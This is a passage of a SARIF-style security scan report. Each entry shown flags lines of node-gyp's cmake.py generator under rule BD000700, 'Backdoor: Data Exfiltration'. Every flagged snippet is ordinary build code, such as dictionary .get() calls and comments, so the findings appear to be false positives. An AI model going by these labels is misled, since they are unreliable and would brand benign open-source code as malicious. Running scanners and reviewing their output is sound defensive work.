                      "text": "        #                       'CXX_COMPILE_FLAGS', cflags_cc, ' ')\n\n        # Instead we must...\n        cflags = config.get(\"cflags\", [])\n        cflags_c = config.get(\"cflags_c\", [])\n        cflags_cxx = config.get(\"cflags_cc\", [])\n        if xcode_settings:\n",
                      "markdown": "`        #                       'CXX_COMPILE_FLAGS', cflags_cc, ' ')\n\n        # Instead we must...\n        cflags = config.get(\"cflags\", [])\n        cflags_c = config.get(\"cflags_c\", [])\n        cflags_cxx = config.get(\"cflags_cc\", [])\n        if xcode_settings:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 985,
                  "startColumn": 28,
                  "endLine": 985,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        #   SetTargetProperty(output, cmake_target_name,\n        #                       'C_COMPILE_FLAGS', cflags_c, ' ')\n\n        # cflags_cc = config.get('cflags_cc')\n        # if cflags_cc is not None:\n        #   SetTargetProperty(output, cmake_target_name,\n        #                       'CXX_COMPILE_FLAGS', cflags_cc, ' ')\n",
                    "rendered": {
                      "text": "        #   SetTargetProperty(output, cmake_target_name,\n        #                       'C_COMPILE_FLAGS', cflags_c, ' ')\n\n        # cflags_cc = config.get('cflags_cc')\n        # if cflags_cc is not None:\n        #   SetTargetProperty(output, cmake_target_name,\n        #                       'CXX_COMPILE_FLAGS', cflags_cc, ' ')\n",
                      "markdown": "`        #   SetTargetProperty(output, cmake_target_name,\n        #                       'C_COMPILE_FLAGS', cflags_c, ' ')\n\n        # cflags_cc = config.get('cflags_cc')\n        # if cflags_cc is not None:\n        #   SetTargetProperty(output, cmake_target_name,\n        #                       'CXX_COMPILE_FLAGS', cflags_cc, ' ')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 980,
                  "startColumn": 27,
                  "endLine": 980,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        # CMake currently does not have target C and CXX flags.\n        # So, instead of doing...\n\n        # cflags_c = config.get('cflags_c')\n        # if cflags_c is not None:\n        #   SetTargetProperty(output, cmake_target_name,\n        #                       'C_COMPILE_FLAGS', cflags_c, ' ')\n",
                    "rendered": {
                      "text": "        # CMake currently does not have target C and CXX flags.\n        # So, instead of doing...\n\n        # cflags_c = config.get('cflags_c')\n        # if cflags_c is not None:\n        #   SetTargetProperty(output, cmake_target_name,\n        #                       'C_COMPILE_FLAGS', cflags_c, ' ')\n",
                      "markdown": "`        # CMake currently does not have target C and CXX flags.\n        # So, instead of doing...\n\n        # cflags_c = config.get('cflags_c')\n        # if cflags_c is not None:\n        #   SetTargetProperty(output, cmake_target_name,\n        #                       'C_COMPILE_FLAGS', cflags_c, ' ')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 970,
                  "startColumn": 24,
                  "endLine": 970,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            output.write(\")\\n\")\n\n        # Defines\n        defines = config.get(\"defines\")\n        if defines is not None:\n            SetTargetProperty(\n                output, cmake_target_name, \"COMPILE_DEFINITIONS\", defines, \";\"\n",
                    "rendered": {
                      "text": "            output.write(\")\\n\")\n\n        # Defines\n        defines = config.get(\"defines\")\n        if defines is not None:\n            SetTargetProperty(\n                output, cmake_target_name, \"COMPILE_DEFINITIONS\", defines, \";\"\n",
                      "markdown": "`            output.write(\")\\n\")\n\n        # Defines\n        defines = config.get(\"defines\")\n        if defines is not None:\n            SetTargetProperty(\n                output, cmake_target_name, \"COMPILE_DEFINITIONS\", defines, \";\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 951,
                  "startColumn": 25,
                  "endLine": 951,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        SetFileProperty(output, cmake_target_output, \"GENERATED\", [\"TRUE\"], \"\")\n\n        # Includes\n        includes = config.get(\"include_dirs\")\n        if includes:\n            # This (target include directories) is what requires CMake 2.8.8\n            includes_name = cmake_target_name + \"__include_dirs\"\n",
                    "rendered": {
                      "text": "        SetFileProperty(output, cmake_target_output, \"GENERATED\", [\"TRUE\"], \"\")\n\n        # Includes\n        includes = config.get(\"include_dirs\")\n        if includes:\n            # This (target include directories) is what requires CMake 2.8.8\n            includes_name = cmake_target_name + \"__include_dirs\"\n",
                      "markdown": "`        SetFileProperty(output, cmake_target_output, \"GENERATED\", [\"TRUE\"], \"\")\n\n        # Includes\n        includes = config.get(\"include_dirs\")\n        if includes:\n            # This (target include directories) is what requires CMake 2.8.8\n            includes_name = cmake_target_name + \"__include_dirs\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 931,
                  "startColumn": 26,
                  "endLine": 931,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n        product_prefix = spec.get(\"product_prefix\", default_product_prefix)\n        product_name = spec.get(\"product_name\", default_product_name)\n        product_ext = spec.get(\"product_extension\")\n        product_ext = \".\" + product_ext if product_ext else default_product_ext\n\n        SetTargetProperty(output, cmake_target_name, \"PREFIX\", product_prefix)\n",
                    "rendered": {
                      "text": "\n        product_prefix = spec.get(\"product_prefix\", default_product_prefix)\n        product_name = spec.get(\"product_name\", default_product_name)\n        product_ext = spec.get(\"product_extension\")\n        product_ext = \".\" + product_ext if product_ext else default_product_ext\n\n        SetTargetProperty(output, cmake_target_name, \"PREFIX\", product_prefix)\n",
                      "markdown": "`\n        product_prefix = spec.get(\"product_prefix\", default_product_prefix)\n        product_name = spec.get(\"product_name\", default_product_name)\n        product_ext = spec.get(\"product_extension\")\n        product_ext = \".\" + product_ext if product_ext else default_product_ext\n\n        SetTargetProperty(output, cmake_target_name, \"PREFIX\", product_prefix)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 930,
                  "startColumn": 27,
                  "endLine": 930,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            )\n\n        product_prefix = spec.get(\"product_prefix\", default_product_prefix)\n        product_name = spec.get(\"product_name\", default_product_name)\n        product_ext = spec.get(\"product_extension\")\n        product_ext = \".\" + product_ext if product_ext else default_product_ext\n\n",
                    "rendered": {
                      "text": "            )\n\n        product_prefix = spec.get(\"product_prefix\", default_product_prefix)\n        product_name = spec.get(\"product_name\", default_product_name)\n        product_ext = spec.get(\"product_extension\")\n        product_ext = \".\" + product_ext if product_ext else default_product_ext\n\n",
                      "markdown": "`            )\n\n        product_prefix = spec.get(\"product_prefix\", default_product_prefix)\n        product_name = spec.get(\"product_name\", default_product_name)\n        product_ext = spec.get(\"product_extension\")\n        product_ext = \".\" + product_ext if product_ext else default_product_ext\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 929,
                  "startColumn": 29,
                  "endLine": 929,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                target_name,\n            )\n\n        product_prefix = spec.get(\"product_prefix\", default_product_prefix)\n        product_name = spec.get(\"product_name\", default_product_name)\n        product_ext = spec.get(\"product_extension\")\n        product_ext = \".\" + product_ext if product_ext else default_product_ext\n",
                    "rendered": {
                      "text": "                target_name,\n            )\n\n        product_prefix = spec.get(\"product_prefix\", default_product_prefix)\n        product_name = spec.get(\"product_name\", default_product_name)\n        product_ext = spec.get(\"product_extension\")\n        product_ext = \".\" + product_ext if product_ext else default_product_ext\n",
                      "markdown": "`                target_name,\n            )\n\n        product_prefix = spec.get(\"product_prefix\", default_product_prefix)\n        product_name = spec.get(\"product_name\", default_product_name)\n        product_ext = spec.get(\"product_extension\")\n        product_ext = \".\" + product_ext if product_ext else default_product_ext\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 879,
                  "startColumn": 21,
                  "endLine": 879,
                  "endColumn": 26,
                  "snippet": {
                    "text": "                target_output_directory = generator_default_variables[\"PRODUCT_DIR\"]\n            elif target_type == \"shared_library\":\n                target_output_directory = \"${builddir}/lib.${TOOLSET}\"\n            elif spec.get(\"standalone_static_library\", False):\n                target_output_directory = generator_default_variables[\"PRODUCT_DIR\"]\n            else:\n                base_path = gyp.common.RelativePath(\n",
                    "rendered": {
                      "text": "                target_output_directory = generator_default_variables[\"PRODUCT_DIR\"]\n            elif target_type == \"shared_library\":\n                target_output_directory = \"${builddir}/lib.${TOOLSET}\"\n            elif spec.get(\"standalone_static_library\", False):\n                target_output_directory = generator_default_variables[\"PRODUCT_DIR\"]\n            else:\n                base_path = gyp.common.RelativePath(\n",
                      "markdown": "`                target_output_directory = generator_default_variables[\"PRODUCT_DIR\"]\n            elif target_type == \"shared_library\":\n                target_output_directory = \"${builddir}/lib.${TOOLSET}\"\n            elif spec.get(\"standalone_static_library\", False):\n                target_output_directory = generator_default_variables[\"PRODUCT_DIR\"]\n            else:\n                base_path = gyp.common.RelativePath(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 873,
                  "startColumn": 38,
                  "endLine": 873,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            output.write(' PROPERTIES EXTERNAL_OBJECT \"TRUE\")\\n')\n\n        # Output directory\n        target_output_directory = spec.get(\"product_dir\")\n        if target_output_directory is None:\n            if target_type in (\"executable\", \"loadable_module\"):\n                target_output_directory = generator_default_variables[\"PRODUCT_DIR\"]\n",
                    "rendered": {
                      "text": "            output.write(' PROPERTIES EXTERNAL_OBJECT \"TRUE\")\\n')\n\n        # Output directory\n        target_output_directory = spec.get(\"product_dir\")\n        if target_output_directory is None:\n            if target_type in (\"executable\", \"loadable_module\"):\n                target_output_directory = generator_default_variables[\"PRODUCT_DIR\"]\n",
                      "markdown": "`            output.write(' PROPERTIES EXTERNAL_OBJECT \"TRUE\")\\n')\n\n        # Output directory\n        target_output_directory = spec.get(\"product_dir\")\n        if target_output_directory is None:\n            if target_type in (\"executable\", \"loadable_module\"):\n                target_output_directory = generator_default_variables[\"PRODUCT_DIR\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 812,
                  "startColumn": 25,
                  "endLine": 812,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    # link directories to targets defined after it is called.\n    # As a result, link_directories must come before the target definition.\n    # CMake unfortunately has no means of removing entries from LINK_DIRECTORIES.\n    library_dirs = config.get(\"library_dirs\")\n    if library_dirs is not None:\n        output.write(\"link_directories(\")\n        for library_dir in library_dirs:\n",
                    "rendered": {
                      "text": "    # link directories to targets defined after it is called.\n    # As a result, link_directories must come before the target definition.\n    # CMake unfortunately has no means of removing entries from LINK_DIRECTORIES.\n    library_dirs = config.get(\"library_dirs\")\n    if library_dirs is not None:\n        output.write(\"link_directories(\")\n        for library_dir in library_dirs:\n",
                      "markdown": "`    # link directories to targets defined after it is called.\n    # As a result, link_directories must come before the target definition.\n    # CMake unfortunately has no means of removing entries from LINK_DIRECTORIES.\n    library_dirs = config.get(\"library_dirs\")\n    if library_dirs is not None:\n        output.write(\"link_directories(\")\n        for library_dir in library_dirs:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 744,
                  "startColumn": 40,
                  "endLine": 744,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    for extra_source in extra_sources:\n        src, real_source = extra_source\n        _, ext = os.path.splitext(real_source)\n        src_type = COMPILABLE_EXTENSIONS.get(ext, None)\n\n        if src_type == \"s\":\n            s_sources.append(src)\n",
                    "rendered": {
                      "text": "    for extra_source in extra_sources:\n        src, real_source = extra_source\n        _, ext = os.path.splitext(real_source)\n        src_type = COMPILABLE_EXTENSIONS.get(ext, None)\n\n        if src_type == \"s\":\n            s_sources.append(src)\n",
                      "markdown": "`    for extra_source in extra_sources:\n        src, real_source = extra_source\n        _, ext = os.path.splitext(real_source)\n        src_type = COMPILABLE_EXTENSIONS.get(ext, None)\n\n        if src_type == \"s\":\n            s_sources.append(src)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 727,
                  "startColumn": 40,
                  "endLine": 727,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    other_sources = []\n    for src in srcs:\n        _, ext = os.path.splitext(src)\n        src_type = COMPILABLE_EXTENSIONS.get(ext, None)\n        src_norm_path = NormjoinPath(path_from_cmakelists_to_gyp, src)\n\n        if src_type == \"s\":\n",
                    "rendered": {
                      "text": "    other_sources = []\n    for src in srcs:\n        _, ext = os.path.splitext(src)\n        src_type = COMPILABLE_EXTENSIONS.get(ext, None)\n        src_norm_path = NormjoinPath(path_from_cmakelists_to_gyp, src)\n\n        if src_type == \"s\":\n",
                      "markdown": "`    other_sources = []\n    for src in srcs:\n        _, ext = os.path.splitext(src)\n        src_type = COMPILABLE_EXTENSIONS.get(ext, None)\n        src_norm_path = NormjoinPath(path_from_cmakelists_to_gyp, src)\n\n        if src_type == \"s\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 716,
                  "startColumn": 15,
                  "endLine": 716,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        )\n\n    # Target and sources\n    srcs = spec.get(\"sources\", [])\n\n    # Gyp separates the sheep from the goats based on file extensions.\n    # A full separation is done here because of flag handing (see below).\n",
                    "rendered": {
                      "text": "        )\n\n    # Target and sources\n    srcs = spec.get(\"sources\", [])\n\n    # Gyp separates the sheep from the goats based on file extensions.\n    # A full separation is done here because of flag handing (see below).\n",
                      "markdown": "`        )\n\n    # Target and sources\n    srcs = spec.get(\"sources\", [])\n\n    # Gyp separates the sheep from the goats based on file extensions.\n    # A full separation is done here because of flag handing (see below).\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 667,
                  "startColumn": 62,
                  "endLine": 667,
                  "endColumn": 67,
                  "snippet": {
                    "text": "    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n    cmake_target_type = cmake_target_type_from_gyp_target_type.get(target_type)\n    if cmake_target_type is None:\n        print(\n            \"Target %s has unknown target type %s, skipping.\"\n",
                    "rendered": {
                      "text": "    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n    cmake_target_type = cmake_target_type_from_gyp_target_type.get(target_type)\n    if cmake_target_type is None:\n        print(\n            \"Target %s has unknown target type %s, skipping.\"\n",
                      "markdown": "`    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n    cmake_target_type = cmake_target_type_from_gyp_target_type.get(target_type)\n    if cmake_target_type is None:\n        print(\n            \"Target %s has unknown target type %s, skipping.\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 665,
                  "startColumn": 25,
                  "endLine": 665,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n    target_name = spec.get(\"target_name\", \"<missing target name>\")\n    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n    cmake_target_type = cmake_target_type_from_gyp_target_type.get(target_type)\n    if cmake_target_type is None:\n",
                    "rendered": {
                      "text": "\n    target_name = spec.get(\"target_name\", \"<missing target name>\")\n    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n    cmake_target_type = cmake_target_type_from_gyp_target_type.get(target_type)\n    if cmake_target_type is None:\n",
                      "markdown": "`\n    target_name = spec.get(\"target_name\", \"<missing target name>\")\n    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n    cmake_target_type = cmake_target_type_from_gyp_target_type.get(target_type)\n    if cmake_target_type is None:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 664,
                  "startColumn": 22,
                  "endLine": 664,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        xcode_settings = gyp.xcode_emulation.XcodeSettings(spec)\n\n    target_name = spec.get(\"target_name\", \"<missing target name>\")\n    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n    cmake_target_type = cmake_target_type_from_gyp_target_type.get(target_type)\n",
                    "rendered": {
                      "text": "        xcode_settings = gyp.xcode_emulation.XcodeSettings(spec)\n\n    target_name = spec.get(\"target_name\", \"<missing target name>\")\n    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n    cmake_target_type = cmake_target_type_from_gyp_target_type.get(target_type)\n",
                      "markdown": "`        xcode_settings = gyp.xcode_emulation.XcodeSettings(spec)\n\n    target_name = spec.get(\"target_name\", \"<missing target name>\")\n    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n    cmake_target_type = cmake_target_type_from_gyp_target_type.get(target_type)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 663,
                  "startColumn": 22,
                  "endLine": 663,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    if flavor == \"mac\":\n        xcode_settings = gyp.xcode_emulation.XcodeSettings(spec)\n\n    target_name = spec.get(\"target_name\", \"<missing target name>\")\n    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n",
                    "rendered": {
                      "text": "    if flavor == \"mac\":\n        xcode_settings = gyp.xcode_emulation.XcodeSettings(spec)\n\n    target_name = spec.get(\"target_name\", \"<missing target name>\")\n    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n",
                      "markdown": "`    if flavor == \"mac\":\n        xcode_settings = gyp.xcode_emulation.XcodeSettings(spec)\n\n    target_name = spec.get(\"target_name\", \"<missing target name>\")\n    target_type = spec.get(\"type\", \"<missing target type>\")\n    target_toolset = spec.get(\"toolset\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 657,
                  "startColumn": 43,
                  "endLine": 657,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    path_from_cmakelists_to_gyp = build_to_gyp\n\n    spec = target_dicts.get(qualified_target, {})\n    config = spec.get(\"configurations\", {}).get(config_to_use, {})\n\n    xcode_settings = None\n    if flavor == \"mac\":\n",
                    "rendered": {
                      "text": "    path_from_cmakelists_to_gyp = build_to_gyp\n\n    spec = target_dicts.get(qualified_target, {})\n    config = spec.get(\"configurations\", {}).get(config_to_use, {})\n\n    xcode_settings = None\n    if flavor == \"mac\":\n",
                      "markdown": "`    path_from_cmakelists_to_gyp = build_to_gyp\n\n    spec = target_dicts.get(qualified_target, {})\n    config = spec.get(\"configurations\", {}).get(config_to_use, {})\n\n    xcode_settings = None\n    if flavor == \"mac\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 657,
                  "startColumn": 17,
                  "endLine": 657,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    path_from_cmakelists_to_gyp = build_to_gyp\n\n    spec = target_dicts.get(qualified_target, {})\n    config = spec.get(\"configurations\", {}).get(config_to_use, {})\n\n    xcode_settings = None\n    if flavor == \"mac\":\n",
                    "rendered": {
                      "text": "    path_from_cmakelists_to_gyp = build_to_gyp\n\n    spec = target_dicts.get(qualified_target, {})\n    config = spec.get(\"configurations\", {}).get(config_to_use, {})\n\n    xcode_settings = None\n    if flavor == \"mac\":\n",
                      "markdown": "`    path_from_cmakelists_to_gyp = build_to_gyp\n\n    spec = target_dicts.get(qualified_target, {})\n    config = spec.get(\"configurations\", {}).get(config_to_use, {})\n\n    xcode_settings = None\n    if flavor == \"mac\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 656,
                  "startColumn": 23,
                  "endLine": 656,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n    path_from_cmakelists_to_gyp = build_to_gyp\n\n    spec = target_dicts.get(qualified_target, {})\n    config = spec.get(\"configurations\", {}).get(config_to_use, {})\n\n    xcode_settings = None\n",
                    "rendered": {
                      "text": "\n    path_from_cmakelists_to_gyp = build_to_gyp\n\n    spec = target_dicts.get(qualified_target, {})\n    config = spec.get(\"configurations\", {}).get(config_to_use, {})\n\n    xcode_settings = None\n",
                      "markdown": "`\n    path_from_cmakelists_to_gyp = build_to_gyp\n\n    spec = target_dicts.get(qualified_target, {})\n    config = spec.get(\"configurations\", {}).get(config_to_use, {})\n\n    xcode_settings = None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 640,
                  "startColumn": 26,
                  "endLine": 640,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    # TODO: It would be nice to be able to tell CMake all dependencies.\n    circular_libs = generator_flags.get(\"circular\", True)\n\n    if not generator_flags.get(\"standalone\", False):\n        output.write(\"\\n#\")\n        output.write(qualified_target)\n        output.write(\"\\n\")\n",
                    "rendered": {
                      "text": "    # TODO: It would be nice to be able to tell CMake all dependencies.\n    circular_libs = generator_flags.get(\"circular\", True)\n\n    if not generator_flags.get(\"standalone\", False):\n        output.write(\"\\n#\")\n        output.write(qualified_target)\n        output.write(\"\\n\")\n",
